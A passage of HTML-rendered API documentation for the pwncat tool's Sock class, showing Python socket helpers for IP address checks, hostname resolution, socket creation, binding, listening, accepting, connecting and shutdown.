                socket.inet_aton(host)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/5] socket.inet_pton</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span
                                    class="hljs-string">"inet_pton"</span>):
            <span class="hljs-keyword">try</span>:
                socket.inet_pton(socket.AF_INET, host)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [3/5] optional module: ipaddress</span>
        <span class="hljs-keyword">try</span>:
            addr = unicode(host)  <span class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">except</span> NameError:
            addr = host
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">try</span>:
                ipaddress.IPv4Address(addr)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> ipaddress.AddressValueError:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> NameError:
            <span class="hljs-keyword">pass</span>

        <span class="hljs-comment"># [4/5] regex</span>
        <span class="hljs-comment"># This is a poor mans solution, but we only want to know if it</span>
        <span class="hljs-comment"># is on the format of IPv4 and not if it is a valid IPv4. The</span>
        <span class="hljs-comment"># validation will be figured out during connect()</span>
        reg = <span class="hljs-string">r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"</span>
        <span class="hljs-keyword">if</span> re.match(reg, host):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [5/5] Nope</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Get functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_iptos_by_name</span>(<span
            class="hljs-params">self, name</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; int</span>
        <span class="hljs-string">"""Get IP Type of Service hexadecimal value by name."""</span>
        <span class="hljs-keyword">assert</span> name <span class="hljs-keyword">in</span> self.__IP_TOS
        <span class="hljs-keyword">return</span> self.__IP_TOS[name]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_family_name</span>(<span
            class="hljs-params">self, family</span>):</span>
        <span class="hljs-comment"># type: (Union[socket.AddressFamily, int]) -&gt; str</span>
        <span class="hljs-string">"""Returns human readable name of given address family as str."""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">return</span> self.__AF_HUMAN[int(family)]
        <span class="hljs-keyword">except</span> KeyError:
            self.__log.error(
                <span class="hljs-string">"Invalid key for address family: %s (type: %s) (valid: %s)"</span>,
                repr(family),
                repr(type(family)),
                repr(self.__AF_HUMAN),
            )
            <span class="hljs-keyword">return</span> <span class="hljs-string">"unknown"</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_type_name</span>(<span
            class="hljs-params">self, sock_type</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; str</span>
        <span class="hljs-string">"""Returns human readable name of given socket type as str."""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">return</span> self.__ST_HUMAN[int(sock_type)]
        <span class="hljs-keyword">except</span> KeyError:
            self.__log.error(
                <span class="hljs-string">"Invalid key for address sock_type: %s (type: %s) (valid: %s)"</span>,
                repr(sock_type),
                repr(type(sock_type)),
                repr(self.__ST_HUMAN),
            )
            <span class="hljs-keyword">return</span> <span class="hljs-string">"unknown"</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_sock_opts</span>(<span
            class="hljs-params">self, sock, opts</span>):</span>
        <span class="hljs-comment"># type: (Sock, socket.socket, Optional[str]) -&gt; List[str]</span>
        <span class="hljs-string">"""Debug logs configured socket options."""</span>
        <span class="hljs-keyword">if</span> opts <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">assert</span> opts <span class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"all"</span>, <span class="hljs-string">"sock"</span>, <span
                                    class="hljs-string">"ipv4"</span>, <span class="hljs-string">"ipv6"</span>, <span
                                    class="hljs-string">"tcp"</span>], <span class="hljs-string">"Value: {}"</span>.format(repr(opts))
        info = []
        <span class="hljs-keyword">for</span> proto, optnames <span class="hljs-keyword">in</span> self.__SOCK_OPTS.items():
            <span class="hljs-keyword">if</span> opts == <span
                                    class="hljs-string">"all"</span> <span
                                    class="hljs-keyword">or</span> proto.lower() == opts:
                <span class="hljs-keyword">for</span> optname <span class="hljs-keyword">in</span> optnames:
                    <span class="hljs-keyword">if</span> proto.lower() == <span class="hljs-string">"sock"</span>:
                        level = socket.SOL_SOCKET
                    <span class="hljs-keyword">elif</span> proto.lower() == <span
                                    class="hljs-string">"ipv4"</span>:
                        level = socket.IPPROTO_IP
                    <span class="hljs-keyword">elif</span> proto.lower() == <span
                                    class="hljs-string">"ipv6"</span>:
                        level = socket.IPPROTO_IPV6
                    <span class="hljs-keyword">elif</span> proto.lower() == <span
                                    class="hljs-string">"tcp"</span>:
                        level = socket.IPPROTO_TCP
                    <span class="hljs-keyword">try</span>:
                        info.append(
                            <span class="hljs-string">"{}: {}: {}"</span>.format(
                                proto,
                                optname,
                                sock.getsockopt(
                                    level, eval(<span class="hljs-string">"socket."</span> + optname)  <span
                                    class="hljs-comment"># pylint: disable=eval-used</span>
                                ),
                            )
                        )
                    <span class="hljs-keyword">except</span> AttributeError:
                        <span class="hljs-keyword">pass</span>
                    <span class="hljs-keyword">except</span> (OSError, socket.error):
                        <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">return</span> info

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gethostbyname</span>(<span
            class="hljs-params">self, host, family, resolvedns</span>):</span>
        <span class="hljs-comment"># type: (Sock, Optional[str], Union[socket.AddressFamily, int], bool) -&gt; str</span>
        <span class="hljs-string">"""Translate hostname into a IP address for a given address family.

        Args:
            host (str): The hostname to resolvea.
            family (socket.family): IPv4 or IPv6 family

        Returns:
            str: Numeric IP address.

        Raises:
            socket.gaierror: If hostname cannot be resolved.
        """</span>
        socktype = <span class="hljs-number">0</span>
        proto = <span class="hljs-number">0</span>
        flags = <span class="hljs-number">0</span>
        port = <span class="hljs-literal">None</span>
        family = int(family)

        <span class="hljs-comment"># [1/4] Wildcard without host</span>
        <span class="hljs-keyword">if</span> host <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">if</span> family == int(socket.AF_INET):
                self.__log.debug(<span class="hljs-string">"Resolving IPv4 name not required, using wildcard: 0.0.0.0"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-string">"0.0.0.0"</span>
            <span class="hljs-keyword">if</span> family == int(socket.AF_INET6):
                self.__log.debug(<span class="hljs-string">"Resolving IPv6 name not required, using wildcard: ::"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-string">"::"</span>
        <span class="hljs-keyword">assert</span> host <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>

        <span class="hljs-comment"># [2/4] Already an IP address</span>
        <span class="hljs-keyword">if</span> family == int(socket.AF_INET6):
            <span class="hljs-keyword">if</span> Sock.is_ipv6_address(host):
                self.__log.debug(<span class="hljs-string">"Resolving IPv6 name not required, already an IP: %s"</span>, host)
                <span class="hljs-keyword">return</span> host
            <span class="hljs-comment"># Map IPv4 address to IPv6</span>
            host6 = <span class="hljs-string">"::ffff:"</span> + host
            <span class="hljs-keyword">if</span> Sock.is_ipv6_address(host6):
                self.__log.debug(<span class="hljs-string">"Resolving IPv4 name not required, changing to IPv6: %s"</span>, host6)
                <span class="hljs-keyword">return</span> host6
        <span class="hljs-keyword">elif</span> family == int(socket.AF_INET):
            <span class="hljs-keyword">if</span> Sock.is_ipv4_address(host):
                self.__log.debug(<span class="hljs-string">"Resolving IPv4 host not required, already an IP: %s"</span>, host)
                <span class="hljs-keyword">return</span> host

        <span class="hljs-comment"># [3/4] Do we disable DNS resolution?</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resolvedns:
            flags = socket.AI_NUMERICHOST

        <span class="hljs-comment"># [4/4] Resolve</span>
        <span class="hljs-keyword">try</span>:
            infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
            addr = str(infos[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>][<span
                                    class="hljs-number">0</span>])
            self.__log.debug(<span class="hljs-string">"Resolved %s host: %s"</span>, self.get_family_name(family), addr)
            <span class="hljs-keyword">return</span> addr
        <span class="hljs-keyword">except</span> (AttributeError, socket.gaierror) <span
                                    class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Resolving {} host: {} failed: {}"</span>.format(
                self.get_family_name(family), str(host), str(error)
            )
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> socket.gaierror(msg)  <span
                                    class="hljs-comment"># type: ignore</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Create functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_socket</span>(<span
            class="hljs-params">self, family, sock_type, reuse_addr, ip_tos_name=None</span>):</span>
        <span class="hljs-comment"># type: (Union[socket.AddressFamily, int], int, bool, Optional[str]) -&gt; socket.socket</span>
        <span class="hljs-string">"""Create TCP or UDP socket.

        Args:
            family (socket.family): The address family for which to create the socket for.
            sock_type (int): The socket type: socket.SOCK_DGRAM or socket.SOCK_STREAM
            reuse_addr (bool): Set SO_REUSEADDR on the socket.
            ip_tos_name (str): Optional IP type of service value to apply to socket

        Returns:
            socket.socket: Returns TCP or UDP socket for the given address family.

        Raises:
            socket.error: If socket cannot be created.
        """</span>
        <span class="hljs-keyword">assert</span> int(sock_type) <span class="hljs-keyword">in</span> [int(socket.SOCK_DGRAM), int(socket.SOCK_STREAM)]
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> int(sock_type) == int(socket.SOCK_DGRAM):
                self.__log.debug(
                    <span class="hljs-string">"Creating (family %d/%s, UDP) socket"</span>, int(family), self.get_family_name(family)
                )
                sock = socket.socket(family, socket.SOCK_DGRAM)
            <span class="hljs-keyword">else</span>:
                self.__log.debug(
                    <span class="hljs-string">"Creating (family %d/%s, TCP) socket"</span>, int(family), self.get_family_name(family)
                )
                sock = socket.socket(family, socket.SOCK_STREAM)
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Creating (family {}/{}, {}) socket failed: {}"</span>.format(
                int(family), self.get_family_name(family), self.get_type_name(sock_type), error
            )
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> socket.error(msg)

        <span class="hljs-keyword">if</span> family == socket.AF_INET6:
            <span class="hljs-comment"># On Linux, IPv6 sockets accept IPv4 too by default, but this makes</span>
            <span class="hljs-comment"># it impossible to bind to both 0.0.0.0 in IPv4 and :: in IPv6.</span>
            <span class="hljs-comment"># On other systems, separate sockets *must* be used to listen for</span>
            <span class="hljs-comment"># both IPv4 and IPv6. For consistency, always disable IPv4 on our</span>
            <span class="hljs-comment"># IPv6 sockets and use a separate ipv4 socket when needed.</span>
            <span class="hljs-comment">#</span>
            <span class="hljs-comment"># Python 2.x on windows doesn't have IPPROTO_IPV6.</span>
            <span class="hljs-keyword">if</span> hasattr(socket, <span class="hljs-string">"IPPROTO_IPV6"</span>):
                self.__log.debug(
                    <span class="hljs-string">"Disabling IPv4 support on %s socket"</span>, self.get_family_name(family)
                )
                sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, <span
                                    class="hljs-number">1</span>)

        <span class="hljs-comment"># Get around the "[Errno 98] Address already in use" error, if the socket is still in wait</span>
        <span class="hljs-comment"># we instruct it to reuse the address anyway.</span>
        <span class="hljs-keyword">if</span> reuse_addr:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span
                                    class="hljs-number">1</span>)

        <span class="hljs-comment"># If requested, set IP Type of Service value for current socket</span>
        <span class="hljs-keyword">if</span> ip_tos_name <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            ip_tos_val = self.get_iptos_by_name(ip_tos_name)
            self.__log.debug(<span class="hljs-string">"Setting IP_TOS to: %d (%s)"</span>, ip_tos_val, ip_tos_name)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, ip_tos_val)
        <span class="hljs-comment"># All done, return it to the requestor</span>
        <span class="hljs-keyword">return</span> sock

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">bind</span>(<span class="hljs-params">self, sock, addr, port</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str, int) -&gt; None</span>
        <span class="hljs-string">"""Bind the socket to an address.

        Args:
            sock (socket.socket): The socket to bind.
            addr (str): The numerical IP address to bind to.
            port (int): The port to bind to.

        Raises:
            socket.error if socket cannot be bound.
        """</span>
        sock_family_name = self.get_family_name(sock.family)
        sock_type_name = self.get_type_name(sock.type)
        self.__log.debug(
            <span class="hljs-string">"Binding (family %d/%s, %s) socket to %s:%d"</span>,
            int(sock.family),
            sock_family_name,
            sock_type_name,
            addr,
            port,
        )
        <span class="hljs-keyword">try</span>:
            sock.bind((addr, port))
        <span class="hljs-keyword">except</span> (OverflowError, OSError, socket.gaierror, socket.error) <span
                                    class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Binding (family {}/{}, {}) socket to {}:{} failed: {}"</span>.format(
                sock.family, sock_family_name, sock_type_name, addr, port, error
            )
            <span class="hljs-keyword">raise</span> socket.error(msg)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listen</span>(<span
            class="hljs-params">self, sock, backlog</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, int) -&gt; None</span>
        <span class="hljs-string">"""Listen for connections made to the socket.

        Args:
            sock (socket.socket): The socket to listen on.
            backlog (int): Listen backlog

        Raises:
            socket.error: If listening fails.
        """</span>
        <span class="hljs-keyword">try</span>:
            self.__log.debug(<span class="hljs-string">"Listening with backlog=%d"</span>, backlog)
            sock.listen(backlog)
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Listening failed: {}"</span>.format(error)
            self.__log.error(msg)
            <span class="hljs-keyword">raise</span> socket.error(msg)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">accept</span>(<span
            class="hljs-params">
        self,
        sockets,  <span class="hljs-comment"># type: List[socket.socket]</span>
        has_quit,  <span class="hljs-comment"># type: Callable[[], bool]</span>
        select_timeout=<span class="hljs-number">0.01</span>,  <span class="hljs-comment"># type: float</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; Tuple[socket.socket, Tuple[str, int]]</span>
        <span class="hljs-string">"""Accept a single connection from given list of sockets.

        Given sockets must be bound to an addr and listening for connections.

        Args:
            sock ([socket.socket]): List of sockets IPv4 and/or IPv6 to accept on.
            has_quit (Callable[[], bool]): A function that returns True if abort is requested.
            select_timeout (float): Timeout to poll sockets for connected clients.

        Returns:
            (socket.socket, str, int): Returns tuple of socket, address and port of client.

        Raises:
            socket.error: Raised if server cannot accept connection or stop signal is requested.
        """</span>
        self.__log.debug(<span class="hljs-string">"Waiting for TCP client"</span>)
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">try</span>:
                ssockets = select.select(sockets, [], [], select_timeout)[
                    <span class="hljs-number">0</span>
                ]  <span class="hljs-comment"># type: List[socket.socket]</span>
            <span class="hljs-keyword">except</span> select.error <span
                                    class="hljs-keyword">as</span> err:
                <span class="hljs-keyword">raise</span> socket.error(err)
            <span class="hljs-keyword">if</span> has_quit():
                <span class="hljs-keyword">raise</span> socket.error(<span class="hljs-string">"SOCK-QUIT signal ACK for accept(): raised socket.error()"</span>)
            <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> ssockets:
                <span class="hljs-keyword">try</span>:
                    conn, addr = sock.accept()
                <span class="hljs-keyword">except</span> (socket.gaierror, socket.error) <span
                                    class="hljs-keyword">as</span> error:
                    msg = <span class="hljs-string">"Accept failed: {}"</span>.format(error)
                    self.__log.error(msg)
                    <span class="hljs-keyword">raise</span> socket.error(msg)
                self.__log.info(
                    <span class="hljs-string">"Client connected from %s:%d (family %d/%s, TCP)"</span>,
                    addr[<span class="hljs-number">0</span>],
                    addr[<span class="hljs-number">1</span>],
                    int(conn.family),
                    self.get_family_name(conn.family),
                )
                <span class="hljs-keyword">return</span> conn, (addr[<span
                                    class="hljs-number">0</span>], addr[<span
                                    class="hljs-number">1</span>])

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span
            class="hljs-params">
        self,
        sock,  <span class="hljs-comment"># type: socket.socket</span>
        addr,  <span class="hljs-comment"># type: str</span>
        port,  <span class="hljs-comment"># type: int</span>
        src_addr=None,  <span class="hljs-comment"># type: Optional[str]</span>
        src_port=None,  <span class="hljs-comment"># type: Optional[int]</span>
        udp_sconnect=False,  <span class="hljs-comment"># type: bool</span>
        udp_send_payload=<span class="hljs-string">b""</span>,  <span class="hljs-comment"># type: bytes</span>
        udp_recv_bufsize=<span class="hljs-number">8192</span>,  <span class="hljs-comment"># type: int</span>
        udp_recv_timeout=<span class="hljs-number">0.1</span>,  <span class="hljs-comment"># type: float</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; Tuple[str, int]</span>
        <span class="hljs-string">"""Connect to a remote socket at given address and port.

        Args:
            sock (socket.socket): The socket to use for connecting/communication.
            addr (str): Numerical IP address of server to connect to.
            port (int): Port of server to connect to.

        Returns:
            Tuple[str,int]: Adress/port tuple of local bind of the client.

        Raises:
            socker.error: If client cannot connect to remote peer or custom bind did not succeed.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># If the socket was already closed elsewhere, it won't have family or type anymore</span>
            sock_family_name = self.get_family_name(sock.family)
            sock_type_name = self.get_type_name(sock.type)
        <span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> error:
            <span class="hljs-keyword">raise</span> socket.error(error)

        <span class="hljs-comment"># Bind to a custom addr/port</span>
        <span class="hljs-keyword">if</span> src_addr <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> src_port <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">try</span>:
                self.__log.debug(<span class="hljs-string">"Binding specifically to %s:%d"</span>, src_addr, src_port)
                self.bind(sock, src_addr, src_port)
            <span class="hljs-keyword">except</span> socket.error <span
                                    class="hljs-keyword">as</span> error:
                <span class="hljs-keyword">raise</span> socket.error(error)
        <span class="hljs-keyword">try</span>:
            self.__log.debug(
                <span class="hljs-string">"Connecting to %s:%d (family %d/%s, %s)"</span>,
                addr,
                port,
                int(sock.family),
                sock_family_name,
                sock_type_name,
            )

            <span class="hljs-comment"># Ensure to use connect() protocol independent</span>
            info = socket.getaddrinfo(addr, port, sock.family, sock.type, sock.proto)
            sock.connect(info[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>])

            <span class="hljs-comment"># UDP stateful connect</span>
            <span class="hljs-comment"># A UDP client doesn't know if the connect() was successful, so the trick</span>
            <span class="hljs-comment"># is to send an empty packet and see if an exception is triggered during</span>
            <span class="hljs-comment"># receive or simply a timeout (which means success).</span>
            <span class="hljs-keyword">if</span> udp_sconnect <span class="hljs-keyword">and</span> int(sock.type) == int(socket.SOCK_DGRAM):
                <span class="hljs-keyword">assert</span> type(udp_send_payload) <span
                                    class="hljs-keyword">is</span> bytes
                <span class="hljs-keyword">assert</span> type(udp_recv_bufsize) <span
                                    class="hljs-keyword">is</span> int
                <span class="hljs-comment"># Some applications like netcat do not like to receive empty</span>
                <span class="hljs-comment"># data, as they treat it as an EOF and will quit upon receive,</span>
                <span class="hljs-comment"># so we're using a nullbyte character instead.</span>
                self.__log.debug(
                    <span class="hljs-string">"Trying to send %d bytes (%s) for UDP stateful connect"</span>,
                    len(udp_send_payload),
                    repr(udp_send_payload),
                )
                sock.send(udp_send_payload)
                sock.settimeout(udp_recv_timeout)
                <span class="hljs-keyword">try</span>:
                    sock.recv(udp_recv_bufsize)
                <span class="hljs-keyword">except</span> socket.timeout:
                    <span class="hljs-keyword">pass</span>
                <span class="hljs-keyword">finally</span>:
                    sock.settimeout(<span class="hljs-number">0</span>)

        <span class="hljs-keyword">except</span> (OSError, socket.error) <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Connecting to {}:{} (family {}/{}, {}) failed: {}"</span>.format(
                addr,
                port,
                sock.family,
                sock_family_name,
                sock_type_name,
                error,
            )
            <span class="hljs-keyword">raise</span> socket.error(msg)

        local = sock.getsockname()
        self.__log.debug(
            <span class="hljs-string">"Connected from %s:%d"</span>,
            local[<span class="hljs-number">0</span>],
            local[<span class="hljs-number">1</span>],
        )
        self.__log.info(
            <span class="hljs-string">"Connected to %s:%d (family %d/%s, %s)"</span>,
            addr,
            port,
            int(sock.family),
            sock_family_name,
            sock_type_name,
        )
        <span class="hljs-keyword">return</span> (local[<span
                                    class="hljs-number">0</span>], local[<span
                                    class="hljs-number">1</span>])

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Destroy functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shutdown_recv</span>(<span
            class="hljs-params">self, sock, name</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
        <span class="hljs-string">"""Shuts down a socket for receiving data (only allow to send data).

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown for receive.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
            <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
            <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
            self.__log.trace(<span class="hljs-string">"Shutting down %s socket for receiving"</span>, name)  <span
                                    class="hljs-comment"># type: ignore</span>
            sock.shutdown(socket.SHUT_RD)
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
            <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shutdown_send</span>(<span
            class="hljs-params">self, sock, name</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
        <span class="hljs-string">"""Shuts down a socket for sending data (only allow to receive data).

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown for send.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
            <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
            <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
            self.__log.trace(<span class="hljs-string">"Shutting down %s socket for sending"</span>, name)  <span
                                    class="hljs-comment"># type: ignore</span>
            sock.shutdown(socket.SHUT_WR)
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
            <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">close</span>(<span
            class="hljs-params">self, sock, name</span>):</span>  <span class="hljs-comment"># pylint: disable=unused-argument,no-self-use</span>
        <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
        <span class="hljs-string">"""Shuts down and closes a socket.

        Args:
            sock (socket.socket): Socket to shutdown and close.
            name (str): Name of the socket used for logging purposes.
        """</span>
        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Logging is removed here as this is too much overhead when using</span>
        <span class="hljs-comment"># the port scanner (it will have thousands of threads and too many</span>
        <span class="hljs-comment"># calls to the logger which will cause issues with its shutdown</span>
        <span class="hljs-comment"># and a massive performance degrade as well.</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
            <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
            <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
            <span class="hljs-comment"># self.__log.trace("Shutting down %s socket", name)  # type: ignore</span>
            sock.shutdown(socket.SHUT_RDWR)
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
            <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
            <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># self.__log.trace("Closing %s socket", name)  # type: ignore</span>
            sock.close()
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-keyword">pass</span>
            <span class="hljs-comment"># self.__log.trace("Could not close %s socket: %s", name, error)  # type: ignore</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li>pwncat.SingletonMeta</li>
                    </ul>
                    <h3>Static methods</h3>
                    <dl>
                        <dt id="pwncat.Sock.is_ipv4_address"><code class="name flex">
                            <span>def <span
                                    class="ident">is_ipv4_address</span></span>(<span>host)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check if a given str is a valid IPv4 address.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_ipv4_address</span>(<span
        class="hljs-params">host</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; bool</span>
    <span class="hljs-string">"""Check if a given str is a valid IPv4 address."""</span>
    <span class="hljs-comment"># [1/5] socket.inet_aton</span>
    <span class="hljs-keyword">if</span> hasattr(socket, <span
                                            class="hljs-string">"inet_aton"</span>):
        <span class="hljs-keyword">try</span>:
            socket.inet_aton(host)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [2/5] socket.inet_pton</span>
    <span class="hljs-keyword">if</span> hasattr(socket, <span
                                            class="hljs-string">"inet_pton"</span>):
        <span class="hljs-keyword">try</span>:
            socket.inet_pton(socket.AF_INET, host)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [3/5] optional module: ipaddress</span>
    <span class="hljs-keyword">try</span>:
        addr = unicode(host)  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-keyword">except</span> NameError:
        addr = host
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">try</span>:
            ipaddress.IPv4Address(addr)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> ipaddress.AddressValueError:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span> NameError:
        <span class="hljs-keyword">pass</span>

    <span class="hljs-comment"># [4/5] regex</span>
    <span class="hljs-comment"># This is a poor mans solution, but we only want to know if it</span>
    <span class="hljs-comment"># is on the format of IPv4 and not if it is a valid IPv4. The</span>
    <span class="hljs-comment"># validation will be figured out during connect()</span>
    reg = <span class="hljs-string">r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"</span>
    <span class="hljs-keyword">if</span> re.match(reg, host):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-comment"># [5/5] Nope</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.is_ipv6_address"><code class="name flex">
                            <span>def <span
                                    class="ident">is_ipv6_address</span></span>(<span>host)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check if a given str is a valid IPv6 address.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_ipv6_address</span>(<span
        class="hljs-params">host</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; bool</span>
    <span class="hljs-string">"""Check if a given str is a valid IPv6 address."""</span>
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> check for link-local addresses (start with: fe80)</span>
    <span class="hljs-comment"># https://stackoverflow.com/questions/3801701</span>

    <span class="hljs-comment"># [1/4] socket.inet_pton</span>
    <span class="hljs-keyword">if</span> hasattr(socket, <span
                                            class="hljs-string">"inet_pton"</span>):
        <span class="hljs-keyword">try</span>:
            socket.inet_pton(socket.AF_INET6, host)
